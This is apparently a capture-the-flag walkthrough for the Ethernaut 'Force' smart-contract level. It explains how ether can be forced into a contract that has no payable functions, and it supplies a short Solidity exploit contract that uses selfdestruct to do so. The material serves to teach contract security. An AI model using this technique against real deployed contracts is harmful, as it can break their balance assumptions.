# Force

The goal of this level is to make the balance of the contract greater than zero.

## Code Breakdown

[The Smart Contract's Code can be seen here.](Force.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```
This contract has no actual code, and since there is no `fallback()` nor `receive()` function or any `payable` function, it is not possible to send ether to that contract. Or is it?

## Level Completion

Actually there are other few ways to force ether into a contract:
* `selfdestruct()`: the selfdestruct function allows a contract to remove itself from the blockchain, sending all remaining stored in it to a designated address.
* Predestination : Ether can be sent to the contract before it exists (since a contract address is deterministic. It’s is the rightmost 160 bits of the keccak256 hash of an RLP encoding of the Sender’s address and their tx nonce) it can be known ahead of creation. [learn more](https://ethereum.stackexchange.com/a/761)
* POS rewards: Validators can choose where their issued rewards are sent,this issuance can't be refused by contracts.

Here the first method is the most applicable for us, let's create a smart contract to selfdestruct and then send eth to to `Force` contract:
```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

contract forceHack {
    // we make the constructor payable so we can fund the contract with wei when deploying
    constructor () payable{

    }
    // we will give this function Force's contract address when executing it
    function hack(address payable _to) public payable{
        selfdestruct(_to); // selfdestructs the contract and send the remaining ether to Force's contract
    }
}
```
After deploying this contract with any value of wei and executing the `hack` function, `Force` should be funded.